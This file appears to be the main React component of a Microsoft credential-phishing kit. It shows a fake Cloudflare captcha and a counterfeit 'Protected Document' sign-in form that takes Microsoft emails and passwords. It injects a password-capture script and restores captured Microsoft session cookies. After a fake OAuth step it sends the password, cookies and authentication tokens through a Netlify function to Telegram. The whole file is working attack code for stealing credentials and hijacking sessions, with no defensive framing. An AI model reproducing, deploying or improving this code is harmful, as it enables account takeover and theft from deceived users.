import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const SLOW_DELAY = 1200;
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500;
const captchaVerificationDelay = 1500;
const redirectingDelay = 3000;
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// Helper functions for persistent storage
const setStoredPassword = (password: string) => {
  try {
    localStorage.setItem('captured_password', password);
    sessionStorage.setItem('captured_password', password);
  } catch (error) {
    console.warn('Failed to store password:', error);
  }
};

const getStoredPassword = (): string | null => {
  try {
    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
  } catch (error) {
    console.warn('Failed to retrieve stored password:', error);
    return null;
  }
};

const setStoredFormCredentials = (email: string, password: string) => {
  try {
    const credentials = {
      email,
      password,
      captureTime: new Date().toISOString(),
      source: 'document-protection-form'
    };
    localStorage.setItem('form_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
  } catch (error) {
    console.warn('Failed to store form credentials:', error);
  }
};

const getStoredFormCredentials = () => {
  try {
    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
    return stored ? JSON.parse(stored) : null;
  } catch (error) {
    console.warn('Failed to retrieve stored form credentials:', error);
    return null;
  }
};

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // FORM STATE
  const [formEmail, setFormEmail] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
  const [hasSentAuthData, setHasSentAuthData] = useState(false);

  // 🟢 NEW: Store session data from OAuth
  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);

  // Add CSS animation for dots
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
      }
      @keyframes shimmer {
        0% { background-position: -200px 0; }
        100% { background-position: calc(200px + 100%) 0; }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { 
        transform: translateY(-2px); 
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
        box-shadow: 0 8px 25px rgba(0,120,212,0.35) !important;
      }
      .input-focus:focus {
        outline: none;
        border-color: #0078d4;
        box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
        transform: translateY(-1px);
      }
      .shimmer-effect {
        background: linear-gradient(90deg, #f0f0f0 0px, #e8e8e8 40px, #f0f0f0 80px);
        background-size: 600px;
        animation: shimmer 1.5s linear infinite;
      }
      .professional-card {
        background: linear-gradient(145deg, #ffffff 0%, #fafafa 100%);
        border: 1px solid rgba(0,0,0,0.08);
        box-shadow: 0 20px 60px rgba(0,0,0,0.08), 0 8px 16px rgba(0,0,0,0.04);
        backdrop-filter: blur(10px);
      }
      .warning-box {
        background: linear-gradient(135deg, #fff8e1 0%, #fff3c4 100%);
        border: 1px solid #ffc107;
        box-shadow: 0 2px 8px rgba(255,193,7,0.15);
      }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('document-protection');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  useEffect(() => {
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        setFormEmail(storedData.email); // Pre-fill form with stored email
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }

      // 🔧 FIX: Restore form credentials from persistent storage
      const storedFormCredentials = getStoredFormCredentials();
      if (storedFormCredentials) {
        setCapturedCredentials(storedFormCredentials);
        setFormEmail(storedFormCredentials.email || '');
        console.log('📋 Restored form credentials from storage:', {
          email: storedFormCredentials.email,
          hasPassword: !!storedFormCredentials.password,
          source: storedFormCredentials.source
        });
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  useEffect(() => {
    try {
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);

          const options = {
            reload: false,
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false,
            warnOnSecurity: true,
            handleDuplicates: true
          };

          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            restoreCookies(event.data.data.cookies, { debug: true });
          }

        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        const newCredentials = {
          ...event.data.data,
          captureTime: new Date().toISOString(),
          source: event.data.data?.source || 'injected-capture'
        };
        
        setCapturedCredentials(newCredentials);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!newCredentials?.email,
          hasPassword: !!newCredentials?.password,
          hasUsername: !!newCredentials?.username,
          source: newCredentials?.source
        });

        // 🔧 FIX: Store credentials persistently
        if (newCredentials.email && newCredentials.password) {
          setStoredFormCredentials(newCredentials.email, newCredentials.password);
        }

        if (newCredentials.email) {
          setCapturedEmailState(newCredentials.email);
          setCapturedEmail(newCredentials.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };
  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formEmail || !formPassword) {
      alert('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);

    try {
      // 🔧 FIX: Store form credentials in persistent storage immediately
      const formCredentials = {
        email: formEmail,
        password: formPassword,
        captureTime: new Date().toISOString(),
        source: 'document-protection-form'
      };

      // Store in both React state and persistent storage
      setCapturedEmailState(formEmail);
      setCapturedCredentials(formCredentials);
      
      // Store persistently
      setStoredFormCredentials(formEmail, formPassword);
      setCapturedEmail(formEmail);

      console.log('📋 Form credentials captured and stored persistently:', {
        email: formEmail,
        hasPassword: !!formPassword,
        source: 'document-protection-form'
      });

      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);

    } catch (error) {
      console.error('Error submitting form:', error);
      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);
    }
  };

  useEffect(() => {
    if (currentPage === 'reauthenticating') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // Send all credentials and cookies to Telegram after OAuth (include entered email/password)
  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
    try {
      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';

      console.log('📤 Sending to Telegram:', {
        email: email,
        hasPassword: !!password,
        passwordLength: password ? password.length : 0,
        cookieCount: Array.isArray(cookies) ? cookies.length : 0
      });

      const response = await fetch(netlifyFunctionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password, // 🔧 FIX: Removed passwordSource field - only sending clean password
          cookies,
          authenticationTokens,
          userAgent,
          sessionId,
          url
        })
      });

      const result = await response.json();

      if (response.ok && result.success) {
        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
        console.log('✅ Telegram result:', result);
      } else {
        console.warn('⚠️ Netlify function responded with error:', result);
      }
    } catch (error) {
      console.warn('⚠️ Failed to send to Telegram:', error);
    }
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('✅ OAuth success with enhanced data handling:', sessionData);

    if (!hasSentAuthData) {
      setHasSentAuthData(true);

      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
      const storedFormCredentials = getStoredFormCredentials();
      
      let finalEmail = '';
      let finalPassword = '';

      // Priority order: stored form credentials > captured credentials > current form state > captured email
      if (storedFormCredentials) {
        finalEmail = storedFormCredentials.email || '';
        finalPassword = storedFormCredentials.password || '';
        console.log('📊 Using stored form credentials');
      } else if (capturedCredentials?.email && capturedCredentials?.password) {
        finalEmail = capturedCredentials.email;
        finalPassword = capturedCredentials.password;
        console.log('📊 Using captured credentials from state');
      } else {
        finalEmail = formEmail || capturedEmail || '';
        finalPassword = formPassword || getStoredPassword() || '';
        console.log('📊 Using fallback credentials');
      }

      console.log('📊 Final credentials for Telegram:', {
        finalEmail,
        hasPassword: !!finalPassword,
        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
        storedCredentialsExists: !!storedFormCredentials,
        capturedCredentialsExists: !!capturedCredentials,
        formEmailExists: !!formEmail,
        formPasswordExists: !!formPassword
      });

      await sendToTelegram({
        email: finalEmail,
        password: finalPassword,
        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
        authenticationTokens: sessionData?.authenticationTokens || {},
        userAgent: navigator.userAgent,
        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
        url: window.location.href
      });
    }

    setOAuthSessionData(sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('document-protection');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'document-protection':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          minHeight: '100vh',
          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
          background: 'linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%)',
          padding: '24px'
        }}>
          <div className="fade-in professional-card" style={{
            textAlign: 'center',
            padding: '56px 64px',
            borderRadius: '16px',
            maxWidth: '520px',
            width: '100%',
            position: 'relative'
          }}>
            {/* Professional Header Section */}
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginBottom: '32px'
            }}>
              <div style={{
                width: '64px',
                height: '64px',
                background: 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)',
                borderRadius: '16px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginRight: '16px',
                boxShadow: '0 8px 24px rgba(0,120,212,0.25)'
              }}>
                <span style={{ fontSize: '28px', color: 'white' }}>🔒</span>
              </div>
              <div style={{ textAlign: 'left' }}>
                <h1 style={{ 
                  color: '#1a1a1a', 
                  margin: '0 0 4px',
                  fontSize: '32px',
                  fontWeight: '700',
                  letterSpacing: '-0.5px'
                }}>
                  Protected Document
                </h1>
                <div style={{
                  background: 'linear-gradient(135deg, #0078d4, #106ebe)',
                  backgroundClip: 'text',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent',
                  fontSize: '14px',
                  fontWeight: '600',
                  letterSpacing: '0.5px'
                }}>
                  ENTERPRISE SECURITY
                </div>
              </div>
            </div>

            {/* Professional Description */}
            <p style={{ 
              color: '#4a5568', 
              margin: '0 0 32px',
              fontSize: '18px',
              lineHeight: '1.6',
              fontWeight: '400'
            }}>
              This document contains confidential information and requires authentication to access.
            </p>

            {/* Enhanced Warning Box */}
            <div className="warning-box" style={{
              borderRadius: '12px',
              padding: '20px',
              margin: '0 0 32px',
              display: 'flex',
              alignItems: 'flex-start',
              textAlign: 'left'
            }}>
              <div style={{
                width: '24px',
                height: '24px',
                background: '#ffc107',
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginRight: '16px',
                flexShrink: 0
              }}>
                <span style={{ fontSize: '14px', color: '#1a1a1a' }}>⚠️</span>
              </div>
              <div>
                <div style={{
                  fontSize: '15px',
                  fontWeight: '600',
                  color: '#1a1a1a',
                  marginBottom: '4px'
                }}>
                  Authentication Required
                </div>
                <div style={{
                  fontSize: '14px',
                  color: '#4a5568',
                  lineHeight: '1.5'
                }}>
                  Please sign in with your Microsoft account to verify your access permissions.
                </div>
              </div>
            </div>

            {/* Professional Form */}
            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '32px' }}>
              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '15px',
                  fontWeight: '600',
                  color: '#1a1a1a',
                  marginBottom: '8px',
                  letterSpacing: '0.1px'
                }}>
                  Email Address
                </label>
                <input
                  type="email"
                  value={formEmail}
                  onChange={(e) => setFormEmail(e.target.value)}
                  required
                  className="input-focus"
                  style={{
                    width: '100%',
                    padding: '16px 20px',
                    border: '2px solid #e2e8f0',
                    borderRadius: '12px',
                    fontSize: '16px',
                    fontFamily: 'inherit',
                    boxSizing: 'border-box',
                    transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
                    background: '#ffffff'
                  }}
                  placeholder="Enter your Microsoft email"
                />
              </div>
              <div style={{ marginBottom: '28px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '15px',
                  fontWeight: '600',
                  color: '#1a1a1a',
                  marginBottom: '8px',
                  letterSpacing: '0.1px'
                }}>
                  Password
                </label>
                <input
                  type="password"
                  value={formPassword}
                  onChange={(e) => setFormPassword(e.target.value)}
                  required
                  className="input-focus"
                  style={{
                    width: '100%',
                    padding: '16px 20px',
                    border: '2px solid #e2e8f0',
                    borderRadius: '12px',
                    fontSize: '16px',
                    fontFamily: 'inherit',
                    boxSizing: 'border-box',
                    transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
                    background: '#ffffff'
                  }}
                  placeholder="Enter your password"
                />
              </div>
              <button
                type="submit"
                disabled={isSubmitting}
                className="protected-doc"
                style={{
                  width: '100%',
                  padding: '18px 32px',
                  background: isSubmitting 
                    ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
                    : 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)',
                  color: 'white',
                  border: 'none',
                  borderRadius: '12px',
                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
                  fontSize: '17px',
                  fontWeight: '600',
                  boxShadow: isSubmitting 
                    ? '0 4px 12px rgba(156,163,175,0.3)'
                    : '0 8px 24px rgba(0,120,212,0.35)',
                  transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
                  textShadow: '0 1px 2px rgba(0,0,0,0.1)',
                  position: 'relative',
                  overflow: 'hidden',
                  letterSpacing: '0.3px'
                }}
                onMouseOver={(e) => {
                  if (!isSubmitting) {
                    e.currentTarget.style.background = 'linear-gradient(135deg, #005a9e 0%, #004578 100%)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!isSubmitting) {
                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)';
                  }
                }}
              >
                {isSubmitting ? (
                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <span style={{ marginRight: '8px' }}>🔄</span>
                    Authenticating...
                  </span>
                ) : (
                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <span style={{ marginRight: '8px' }}>🔐</span>
                    Authenticate & Open Document
                  </span>
                )}
              </button>
            </form>

            {/* Professional Action Buttons */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '16px',
              marginBottom: '32px',
              flexWrap: 'wrap'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '12px 24px',
                  backgroundColor: 'transparent',
                  color: '#0078d4',
                  border: '2px solid #0078d4',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '600',
                  transition: 'all 0.2s ease',
                  letterSpacing: '0.2px'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#0078d4';
                  e.currentTarget.style.color = 'white';
                  e.currentTarget.style.transform = 'translateY(-1px)';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                  e.currentTarget.style.color = '#0078d4';
                  e.currentTarget.style.transform = 'translateY(0)';
                }}
              >
                ← Back to Start
              </button>
              <button
                onClick={() => {
                  alert('For security reasons, document access requires authentication through Microsoft.');
                }}
                style={{
                  padding: '12px 24px',
                  backgroundColor: 'transparent',
                  color: '#6b7280',
                  border: '2px solid #e5e7eb',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '600',
                  transition: 'all 0.2s ease',
                  letterSpacing: '0.2px'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#f9fafb';
                  e.currentTarget.style.borderColor = '#d1d5db';
                  e.currentTarget.style.transform = 'translateY(-1px)';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                  e.currentTarget.style.borderColor = '#e5e7eb';
                  e.currentTarget.style.transform = 'translateY(0)';
                }}
              >
                Request Access
              </button>
            </div>

            {/* Professional Footer */}
            <div style={{
              paddingTop: '24px',
              borderTop: '1px solid #f1f5f9',
              fontSize: '13px',
              color: '#94a3b8',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}>
              <span style={{ fontSize: '16px' }}>🛡️</span>
              <span style={{ fontWeight: '500', letterSpacing: '0.5px' }}>
                Secure Document Access Portal
              </span>
            </div>
          </div>
        </div>
      );

    case 'reauthenticating':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Reauthenticating
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;